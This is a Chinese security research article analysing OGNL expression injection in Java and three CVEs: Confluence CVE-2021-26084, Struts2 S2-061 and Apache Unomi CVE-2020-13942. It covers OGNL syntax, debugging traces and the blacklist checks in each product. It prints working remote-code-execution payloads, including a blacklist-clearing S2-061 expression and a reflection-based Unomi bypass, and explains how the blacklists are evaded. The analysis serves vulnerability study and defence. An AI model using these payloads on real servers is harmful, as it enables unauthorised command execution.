> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10482)

> 先知社区，先知安全技术社区

0x00 前言
-------

前段时间出现的 Confluence OGNL 漏洞（CVE-2021-26084）引起了我对 Java OGNL 表达式注入的兴趣，当时没有时间立刻研究，近期又捡起来学习和分析，用了近半月整理了本文，如有不当之处，还请批评指正。

0x01 OGNL 是什么？
--------------

先来看一个例子:

```
Class SchoolMaster{
    String name = "wanghua";
}

Class School
{
    String name = "tsinghua";
    SchoolMaster schoolMaster;
}

Class Student
{
    String name = "xiaoming";
    School school;
}


```

创建实例学校`school = new School()`、学生`student = new Student()`和校长`schoolMaster = new SchoolMaster()`，将学校校长指定为`schoolMaster`实例 -`school.schoolMaster = schoolMaster`，学生的学校指定为`school`实例 -`student.school = school`，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。

那么 OGNL 就是实现对象图导航语言，全称 Object-Graph Navigation Language。通过它我们可以存取 Java 对象的任意属性、调用 Java 对象的方法以及实现类型转换等。

0x02 OGNL 三元素
-------------

OGNL 基本使用方法示例：

```
// 创建Student对象
School school = new School();
school.setName("tsinghua");
school.setSchoolMaster(new SchoolMaster("wanghua"));
Student student1 = new Student();
student1.setName("xiaoming");
student1.setSchool(school);
Student student2 = new Student();
student2.setName("zhangsan");
student2.setSchool(school);

// 创建上下文环境
OgnlContext context = new OgnlContext();
// 设置跟对象root
context.setRoot(student1);
context.put("student2", student2);
// 获取ognl的root相关值
Object name1 = Ognl.getValue("name", context, context.getRoot());
Object school1 = Ognl.getValue("school.name", context, context.getRoot());
Object schoolMaster1 = Ognl.getValue("school.schoolMaster.name", context, context.getRoot());
System.out.println(name1 + ":学校-" + school1 + ",校长-"+schoolMaster1);
// 获取ognl非root相关值
Object name2 = Ognl.getValue("#student2.name", context, context.getRoot());
Object school2 = Ognl.getValue("#student2.school.name", context, context.getRoot());
Object schoolMaster2 = Ognl.getValue("#student2.school.schoolMaster.name", context, context.getRoot());
System.out.println(name2 + ":学校-" + school2 + ",校长-"+schoolMaster2);


```

输出结果：

```
xiaoming:学校-tsinghua,校长-wanghua
zhangsan:学校-tsinghua,校长-wanghua

```

不难看出，OGNL getValue 需要三元素：expression 表达式、context 上下文及 root 对象。那么什么是三元素：

> expression 表达式：表达式是整个 OGNL 的核心，通过表达式来告诉 OGNL 需要执行什么操作；  
> root 根对象：OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当 OGNL 通过表达式规定了 “干什么” 以后，还需要指定对谁进行操作；  
> context 上下文对象：context 以 MAP 的结构、利用键值对关系来描述对象中的属性以及值，称之为 OgnlContext，可以理解为对象运行的上下文环境，其实就是规定 OGNL 的操作在哪里。

在上面示例中，根对象是 student1 实例，context 中设置了根对象和非根对象 student2，表达式有`name`、`school.name`、`school.schoolMaster.name`和`student2.name`、`#student2.school.name`、`student2.school.schoolMaster.name`，前三个是通过表达式获取 root 也就是 student1 对象的相关属性，后三个是通过表达式获取容器变量 student2 对象的相关属性。

0x03 OGNL 表达式语法
---------------

### 符号的使用：

在上一部分我们已经接触了`.`和`#`符号在表达式中的使用，通过`.`可以获取对象属性，`#`可以获取非 root 的 Student 对象。

OGNL 表达式支持 Java 基本运算，所以运算符`+`、`-`、`*`、`/`、`%`等在 OGNL 都是支持的，另外还支持`in`、`eq`、`gt`等。

除了基本运算符，`.`、`@`、`#`在 OGNL 中都有特殊含义。

1、通过`.`获取对象的属性或方法：

```
student
student.name
student.school
student.school.name
student.takingClasses("英语")

```

2、三种类型对象的获取：

静态对象、静态方法和静态变量：`@`

```
@java.lang.System@getProperty("user.dir")
@java.lang.Math@abs(-111)

```

非原生类型对象：`#`

```
#student.name
#student.takingClasses("英语")

```

简单对象：直接获取

```
"string".lenth
5
true

```

3、`%`符号的用途是在标志的属性为字符串类型时，告诉执行环境 %{} 里的是 OGNL 表达式并计算表达式的值。

4、`$`在配置文件中引用 OGNL 表达式。

### 集合表达式：

`new`创建实例：

```
new java.lang.String("testnew")

```

`{}`和`[]`的用法：

在 OGNL 中，可以用`{}`或者它的组合来创建列表、数组和 map，`[]`可以获取下标元素。

创建 list：`{value1,value2...}`

```
{1,3,5}[1]

```

创建数组：`new type[]{value1,value2...}`

```
new int[]{1,3,5}[0]

```

创建 map：`#{key:value,key1:value1...}`

```
#{"name":"xiaoming","school":"tsinghua"}["school"]

```

除了一些符号和集合，还支持 Projection 投影和 Selection 选择等，具体可参考官方文档：[https://commons.apache.org/proper/commons-ognl/language-guide.html](https://commons.apache.org/proper/commons-ognl/language-guide.html) 附录 Operators 部分。

0x04 命令执行调试分析
-------------

通过上面表达式的学习我们很容易能够写出 Java 执行命令的表达式：

```
@java.lang.Runtime@getRuntime().exec("calc")
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

```

### Ognl 低版本：2.7.3 测试

调试分析`Ognl.getValue("@java.lang.Runtime@getRuntime().exec(\"calc\")", context, context.getRoot());`执行流程。下图是表达式对应的语法树（AST），下面的分析可以结合图片思考。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104201437-c76723d8-3d68-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104201437-c76723d8-3d68-1.png)  
Ognl.getValue() 处理表达式时，会先生成一个 tree，这个 tree 本质是 SimpleNode 实例，树的每个节点都是一个 ASTChain 实例，ASTChain 继承自 SimpleNode。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104201755-3d9afa52-3d69-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104201755-3d9afa52-3d69-1.png)  
当调用`node.getValue(ognlContext, root);`时，会调用`SimpleNode.getValue()`进行处理，`SimpleNode.getValue()`会通过`SimpleNode.evaluateGetValueBody()`计算结果

```
public final Object getValue(OgnlContext context, Object source) throws OgnlException {
    Object result = null;
    if (context.getTraceEvaluations()) {
        ...
    } else {
        result = this.evaluateGetValueBody(context, source);
    }
    return result;
}


```

`SimpleNode.evaluateGetValueBody()`在计算非常量情况的结果时会调用子类的 getValueBody，Ognl 在处理节点时分为多种情况进行处理：[ASTChain](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTChain.html)、[ASTConst](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTConst.html)、[ASTCtor](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTCtor.html)、[ASTInstanceof](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTInstanceof.html)、[ASTList](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTList.html)、[ASTMethod](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTMethod.html)、[ASTStaticField](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticField.html)、[ASTStaticMethod](https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/ASTStaticMethod.html) 等。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104201943-7e0c94e2-3d69-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104201943-7e0c94e2-3d69-1.png)

首先这里最开始是一个 ASTChain `@java.lang.Runtime@getRuntime().exec("calc")`，`ASTChain.getValueBody()`在处理时，会迭代调用 getValue 处理子节点的结果，最终还是会调用 ASTXXX 方法处理节点的结果。

```
protected Object getValueBody(OgnlContext context, Object source) throws OgnlException {
    Object result = source;
    int i = 0;
    // 迭代处理字子节点的结果
    for(int ilast = this._children.length - 1; i <= ilast; ++i) {
        boolean handled = false;
        ......
        if (!handled) {
            // 调用子节点的getValue方法处理
            result = this._children[i].getValue(context, result);
        }
    }

    return result;
}


```

当 Ognl 计算`@java.lang.Runtime@getRuntime()`时，由于方法时静态方法会调用`ASTStaticMethod.getValueBody`。`ASTStaticMethod.getValueBody`通过`OgnlRuntime.callStaticMethod`处理方法的调用。

```
protected Object getValueBody(OgnlContext context, Object source) throws OgnlException {
    Object[] args = OgnlRuntime.getObjectArrayPool().create(this.jjtGetNumChildren());
    Object root = context.getRoot();

    try {
        int i = 0;

        for(int icount = args.length; i < icount; ++i) {
            args[i] = this._children[i].getValue(context, root);
        }

        Object var10 = OgnlRuntime.callStaticMethod(context, this._className, this._methodName, args);
        return var10;
    } finally {
        OgnlRuntime.getObjectArrayPool().recycle(args);
    }
}


```

通过`OgnlRuntime.callAppropriateMethod()`处理方法调用，最终会调用`Method.invoke()`进行方法调用并返回值。

```
public static Object callAppropriateMethod(OgnlContext context, Object source, Object target, String methodName, String propertyName, List methods, Object[] args) throws MethodFailedException {
    Throwable reason = null;
    Object[] actualArgs = _objectArrayPool.create(args.length);

    try {
        Method method = getAppropriateMethod(context, source, target, propertyName, methods, args, actualArgs);
        int i;
        ......
            if (target != null) {
                className = target.getClass().getName() + ".";
            }
        ......

            for(int ilast = args.length - 1; i <= ilast; ++i) {
                ......
            }

        throw new NoSuchMethodException(className + methodName + "(" + buffer + ")");
    }
    ......

        Object var26 = invokeMethod(target, method, convertedArgs);
    return var26;
} catch (NoSuchMethodException var21) {
    ......
}


public static Object invokeMethod(Object target, Method method, Object[] argsArray) throws InvocationTargetException, IllegalAccessException {
    ......
    Object result;
    if (syncInvoke) {
            ......
            result = method.invoke(target, argsArray);
            i......
        }
    } else {
        ......
        result = method.invoke(target, argsArray);
    }
    return result;
}


```

同样的，Ognl 计算`exec("calc")`时，调用`ASTMethod.getValueBody`，最终也是在`OgnlRuntime.callAppropriateMethod()`中调用`Method.invoke()`处理。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104201848-5cf9b12c-3d69-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104201848-5cf9b12c-3d69-1.png)

### Ognl 3.2.18 测试

Ognl>=3.1.25、Ognl>=3.2.12 配置了黑名单检测，会导致上面的实验失败，提示`cannot be called from within OGNL invokeMethod() under stricter invocation mode`，在使用 StricterInvocation 模式下不允许执行`java.lang.Runtime.getRuntime()`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202126-bb69bcd4-3d69-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202126-bb69bcd4-3d69-1.png)

对比上面 2.7.3 版本，在`OgnlRuntime.invokeMethod`中，添加了黑名单判断，当命中黑名单会出现上图的报错：`ClassResolver`、`MethodAccessor`、`MemberAccess`、`OgnlContext`、`Runtime`、`ClassLoader`、`ProcessBuilder`等。

```
public static Object invokeMethod(Object target, Method method, Object[] argsArray) throws InvocationTargetException, IllegalAccessException {
    if (_useStricterInvocation) {
        Class methodDeclaringClass = method.getDeclaringClass();
        if (AO_SETACCESSIBLE_REF != null && AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF != null && AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF != null && SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF != null && SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) {
            throw new IllegalAccessException("Method [" + method + "] cannot be called from within OGNL invokeMethod() " + "under stricter invocation mode.");
        }
    }

    ......
        result = invokeMethodInsideSandbox(target, method, argsArray);
    }

    return result;
}


```

0x05 近期三个漏洞的分析
--------------

在 CVE 搜索`OGNL`，前三个漏洞分别是 Confluence 的 CVE-2021-26084、Struts2 的 CVE-2020-17530 和 Apache Unomi 的 CVE-2020-13942，本次对这三个漏洞进行分析。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202217-d9c49820-3d69-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202217-d9c49820-3d69-1.png)

### Confluence CVE-2021-26084

#### velocity 模板引擎语法：

1、基本符号

```
"#"标识velocity的脚本语句
"$"获取一个对象或变量
"{}"用来标识velocity变量
"!"对变量为null的情况在页面显示为空白字符串
用双引号还是单引号表示，默认“双引号，可以在stringliterals.interpolate=false改变默认处理方式

```

2、示例：

```
## 1、变量引用
$name
## 2、语句/指令-变量赋值
#($)
#set($value= 123)
## 3、#include和#parse的作用都是引入本地文件。#include引入的文件内容不会被velocity模板引擎解析。#parse引入的文件内容，将解析其中的velocity并交给模板，相当于把引入的文件内容copy到文件中。
#parse ( "/template/includes/actionerrors.vm" )
#include ( "/template/includes/actionerrors.vm" )


```

更多语法可参考：[http://velocity.apache.org/engine/1.7/user-guide.html](http://velocity.apache.org/engine/1.7/user-guide.html)

#### 漏洞分析：

confluence 处理 velocity 模板，将 velocity 语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用`ognl.getValue()`处理。confluence 处理 vm 文件，首先将 vm 内容转为 AST 语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。

Confluence 的 Velocity 模板引擎处理 vm 文件流程主要在`com.opensymphony.webwork.dispatcher.VelocityResult.doExecute()`，首先获取 OgnlValueStack、context 上下文、getTemplate 获取 vm 文件，接下来用`merge`处理合并页面结果，将结果输出给 writer。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202355-1425fc0c-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202355-1425fc0c-3d6a-1.png)

merge 调用`((SimpleNode)this.data).render(ica, writer);`方法处理，先将 vm 文件的内容转为 AST 语法树，便于计算每个节点的结果。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202413-1eb567e8-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202413-1eb567e8-3d6a-1.png)

本次漏洞涉及的`createpage-entervariables.vm`文件经过解析后的 AST 语法树如下图，每一个 ASTXXX 处理程序都继承自 SimpleNode.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202440-2f1aa51c-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202440-2f1aa51c-3d6a-1.png)

queryString 在第 7 个节点，归属 applyDecorator 指令，程序处理时将 applyDecorator 又分为 35 个节点，queryString 在`[#tag], [ ], [(], ["Hidden"], [ ], ["], [ ], ["value='$!queryString'"], [)]`节点中处理，我们重点看这个处理过程。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202510-41175328-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202510-41175328-3d6a-1.png)

`[#tag], [ ], [(], ["Hidden"], [ ], ["], [ ], ["value='$!queryString'"], [)]`节点属于 AbstractTagDirective，会调用`AbstractTagDirective.render()`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202535-4f7bd394-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202535-4f7bd394-3d6a-1.png))

`AbstractTagDirective.render()`首先调用`applyAttributes(contextAdapter, node, object)`处理参数，其中`AbstractTagDirective.createPropertyMap()`创建参数 Map，保存 property 键值对。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202614-672a3a30-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202614-672a3a30-3d6a-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202639-7610d46e-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202639-7610d46e-3d6a-1.png)

保存后`AbstractTagDirective.render()`调用`AbstractTagDirective.processTag()`处理 tag

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202703-842e562a-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202703-842e562a-3d6a-1.png)

通过`AbstractTagDirective.processTag()`最终会调用`AbstractUITag.doEndTag()`，doEndTag 调用`evaluateParams()`处理参数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202737-98760a4c-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202737-98760a4c-3d6a-1.png)

`AbstractUITag.evaluateParams`通过`addParameter()`添加 name 和 value，value 的值通过`findValue()`获取具体的值。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202808-ab21113c-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202808-ab21113c-3d6a-1.png)

调用`getValueFinder().findValue(expr, toType)`时会先调用`SafeExpressionUtil.isSafeExpression()`进行安全检查，而`isSafeExpression()`会通过`containsUnsafeExpression()`处理，这正是本次漏洞的关键之处。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202833-b9d92854-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202833-b9d92854-3d6a-1.png)

`containsUnsafeExpression()`代码如下，递归检查节点及其子节点是否包含黑名单。

```
private static boolean containsUnsafeExpression(Node node) {
    String nodeClassName = node.getClass().getName();
    if (UNSAFE_NODE_TYPES.contains(nodeClassName)) {
        return true;
    } else if ("ognl.ASTProperty".equals(nodeClassName) && UNSAFE_PROPERTY_NAMES.contains(node.toString())) {
        return true;
    } else if ("ognl.ASTMethod".equals(nodeClassName) && UNSAFE_METHOD_NAMES.contains(node.toString())) {
        return true;
    } else if ("ognl.ASTVarRef".equals(nodeClassName) && UNSAFE_VARIABLE_NAMES.contains(node.toString())) {
        return true;
    } else {
        for(int i = 0; i < node.jjtGetNumChildren(); ++i) {
            Node childNode = node.jjtGetChild(i);
            if (childNode != null && containsUnsafeExpression(childNode)) {
                return true;
            }
        }

        return false;
    }
}


```

黑名单包括静态方法、静态属性、构造方法、class、classLocader、getClass()、getClassLoader()、_memberAccess、context、request 等。

```
static {
    Set set = new HashSet();
    set.add("ognl.ASTStaticMethod");
    set.add("ognl.ASTStaticField");
    set.add("ognl.ASTCtor");
    set.add("ognl.ASTAssign");
    UNSAFE_NODE_TYPES = Collections.unmodifiableSet(set);
    set = new HashSet();
    set.add("class");
    set.add("classLoader");
    UNSAFE_PROPERTY_NAMES = Collections.unmodifiableSet(set);
    set = new HashSet();
    set.add("getClass()");
    set.add("getClassLoader()");
    UNSAFE_METHOD_NAMES = Collections.unmodifiableSet(set);
    set = new HashSet();
    set.add("#_memberAccess");
    set.add("#context");
    set.add("#request");
    set.add("#parameters");
    set.add("#session");
    set.add("#application");
    UNSAFE_VARIABLE_NAMES = Collections.unmodifiableSet(set);
}


```

`UNSAFE_PROPERTY_NAMES`有`class`和`classLoader`两个元素，不包含`["class"]`，而`["class"]`子节点`"class"`属于 ASTConst 不进行检查，因此可绕过，对于方法黑名单，ASTMethod 仅禁止`getClass()`和`getClassLoader()`，`forName`、`getMethod`、`invoke`等不在禁止范围。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202902-cafbdeb0-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202902-cafbdeb0-3d6a-1.png)

特别说明下，**confluence 使用的 ognl 版本是 2.6.5，属于较早版本，没有在 invokeMethod 中添加黑名单进行安全检查**，因此 payload 在 ognl 中可以顺利执行。（可参考 0x04-Ognl 3.2.18 测试）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104202938-e0b6dfac-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104202938-e0b6dfac-3d6a-1.png)

另外，除了`queryString`，vm 中还有两个看起来可利用的参数：

```
#tag ("Hidden" "value='$!queryString'")
#tag ("Hidden" ")
#tag ("Hidden" ")


```

经过尝试`linkCreation`同样也可以利用，跟`queryString`一样的：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203027-fda7fa24-3d6a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203027-fda7fa24-3d6a-1.png)

而`templateId`不能利用，因为该参数实际需要的是 int，后面强制转换会报错。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104214954-176b48de-3d76-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104214954-176b48de-3d76-1.png)

### Struts2 CVE-2020-17530（S2-061）

Struts2 的 ognl RCE 漏洞主要是添加黑名单来修复和绕过黑名单。

#### Struts2 防护机制

如果需要绕过 Struts2 的历史 ognl rce 的修复，需要考虑三点：

```
struts-defult.xml的struts.excludedClasses和struts.excludedPackageNames部分
com.opensymphony.xwork2.ognl.SecurityMemberAccess
Ognl.OgnlRuntime.invokeMethod()中的黑名单

```

struts2 在`struts-defult.xml`文件中加入了一些类和包作为黑名单：

```
<!-- s2-061修复前的黑名单 -->
<constant 
              value="
                java.lang.Object,
                java.lang.Runtime,
                java.lang.System,
                java.lang.Class,
                java.lang.ClassLoader,
                java.lang.Shutdown,
                java.lang.ProcessBuilder,
                sun.misc.Unsafe,
                com.opensymphony.xwork2.ActionContext" />
    <constant 
              value="
                ognl.,
                java.io.,
                java.net.,
                java.nio.,
                javax.,
                freemarker.core.,
                freemarker.template.,
                freemarker.ext.jsp.,
                freemarker.ext.rhino.,
                sun.misc.,
                sun.reflect.,
                javassist.,
                org.apache.velocity.,
                org.objectweb.asm.,
                org.springframework.context.,
                com.opensymphony.xwork2.inject.,
                com.opensymphony.xwork2.ognl.,
                com.opensymphony.xwork2.security.,
                com.opensymphony.xwork2.util." />


```

构造 ValueStack 时，在`com.opensymphony.xwork2.ognl.OgnlValueStack.setOgnlUtil()`中会设置`SecurityMemberAccess`，将`struts-defult.xml`的黑名单加载进去

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203236-4af3dd66-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203236-4af3dd66-3d6b-1.png)

我调试分析时用的 struts2 版本是 2.5.25，该版本中用到的 ognl 版本是 3.1.28，该版本的`OgnlRuntime.invokeMethod`同样做了一些黑名单限制（同 “0x04-Ognl 3.2.18 测试 “）。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203258-5786bad0-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203258-5786bad0-3d6b-1.png)

#### 漏洞分析：

payload：

```
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#access=#bean.get("memberAccess")).(#bean.setBean(#access)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#cmd={'whoami'}).(#execute.exec(#cmd))}

```

根据 [Struts2 S2-061 漏洞分析 (CVE-2020-17530)](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g) 文章进行调试分析，总结 s2-061 绕过 s2-059 的思路主要有以下几点：

1、`#application` 中的 `org.apache.tomcat.InstanceManager.newInstance()`可以实例化无参构造的类；

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203320-64bf4e1a-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203320-64bf4e1a-3d6b-1.png)

2、可以通过`#attr`和`com.opensymphony.xwork2.util.ValueStack.ValueStack`获取 valuestack。`org.apache.commons.collections.BeanMap`的 setBean 方法设置为 valuestack，这样 get 方法传入`context`就可以调用`com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()`，然后将获取的 context 同样用 setBean 方法进行设置，get 传入`memberAccess`进行获取；（关于 ValueStack、OgnlContext、memberAccess 和 SecurityMemberAccess 的关系推荐阅读 Lucifaer 大佬的[浅析 OGNL 攻防史](https://paper.seebug.org/794/#22-valuestack)进行了解）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203401-7d5d6f6a-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203401-7d5d6f6a-3d6b-1.png)

3、获取到的 memberAccess 实际就是`com.opensymphony.xwork2.ognl.SecurityMemberAccess`，再利用 BeanMap 的 put 方法将 SecurityMemberAccess`excludedClasses`和`excludedPackageNames`置空，这样子就绕过了 struts2 的黑名单；

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203429-8e0d02a8-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203429-8e0d02a8-3d6b-1.png)

4、需要注意第三点只是绕过了 struts2 黑名单，ognl 黑名单没有被绕过，避开 ognl 黑名单，可以利用 struts2 的黑名单，其中`freemarker.template.utility.Execute`存在无参构造，`freemarker.template.utility.Execute.exec()` 方法可执行命令。

### Apache Unomi CVE-2020-13942

Apache Unomi CVE-2020-13942 包括 OGNL RCE 和 MVEL RCE，本文仅针对 OGNL 进行分析。

对比 1.5.1 和 1.5.2 版本，修复该漏洞的提交 [Improve scripting security ([#179])](https://github.com/apache/unomi/commit/0b81ba35dd3c3c2e0a92ce06592b3df90571eced) 中主要对`org.apache.unomi.plugins.baseplugin.conditions.PropertyConditionEvaluator.java`、`SecureFilteringClassLoader.java`等进行了修改，并且增加了`ExpressionFilter.java`来检查表达式。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203733-fba32216-3d6b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203733-fba32216-3d6b-1.png)

#### 漏洞分析：

unomi 处理 parameterValues 主要在`org.apache.unomi.plugins.baseplugin.conditions.PropertyConditionEvaluator`，`getPropertyValue()`获取请求的参数值。在该方法中默认会先通过`getHardcodedPropertyValue()`处理。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203915-385371f2-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203915-385371f2-3d6c-1.png)

`getHardcodedPropertyValue()`中当`propertyName`不等于`segments`、`consents`、`properties.XXX`等，会返回`NOT_OPTIMIZED`，然后再通过`getOGNLPropertyValue()`处理，也就是说`propertyName`未遵照预设的结果时会按照 ognl 表达式处理。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203930-416fa526-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203930-416fa526-3d6c-1.png)

在`getOGNLPropertyValue()`中，通过`accessor.get(ognlContext, item)`处理，这里`accessor`就是 ASTChain。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104203946-4ad87714-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104203946-4ad87714-3d6c-1.png)

那么最终会调用`ASTChain.getValue()`处理表达式。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104204002-54c964f4-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104204002-54c964f4-3d6c-1.png)

unomi 1.5.1 用的 ognl 版本是 3.2.14，该版本在`OgnlRuntime.invokeMethod`中同样存在黑名单判断。只要表达式绕过 Ognl 的黑名单就可以达到目的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104204020-5f0632d0-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104204020-5f0632d0-3d6c-1.png)

我们来看下表达式：

```
(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))

```

整个的思路是用 Class 和 Method 以及`Method.invoke`来绕过黑名单。

`this.getClass()`是一个 Class 对象，`Class`没有在黑名单中，因此上面`Class.forName()`可以执行，同理`Class.forName()`会得到一个 Class 对象，因此`runtimeclass.getDeclaredMethods()`可以正常执行，并且返回 Runtime 的方法数组，`Method`没有在黑名单，遍历方法名获取到`getRuntime`的 Method 对象 (不可以直接`getDeclaredMethod("getRuntime")`会报错)，利用 invoke 执行`getRuntime`，同理获取`exec`并执行。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104204048-700375a2-3d6c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104204048-700375a2-3d6c-1.png)

最后顺便提一下 unomi 小于 1.5.1 版本存在 CVE-2020-11975，查了下 1.5.0 使用的 ognl 版本是 3.2.11，该版本`OgnlRuntime.invokeMethod`没有黑名单，这也是 Runtime 的 payload`(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"calc\"))`可以直接运行的原因。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211104220350-09400ad6-3d78-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211104220350-09400ad6-3d78-1.png)

0x06 思考与总结
----------

上面提到的几个 OGNL 漏洞的修复基本都是采用黑名单来限制 OGNL 注入，开发人员在使用 ognl 时，除了 ognl 需要注意使用较高版本，还要注意添加额外的防护措施。当然，使用黑名单的防护方式也许一时可以防住 OGNL 的 RCE，但总有被绕过的风险，另外除了命令执行，文件操作、SSRF 也不是没有可能。

0x07 参考链接：
----------

```
https://commons.apache.org/proper/commons-ognl/apidocs/index.html
https://stackoverflow.com/questions/2046761/what-is-object-graph-in-java
https://developer.aliyun.com/article/135737
https://juejin.cn/post/6844904013683507207
https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
https://xz.aliyun.com/t/8135
https://www.cnblogs.com/yangzhinian/p/4885973.html
https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g
http://velocity.apache.org/engine/1.7/user-guide.html
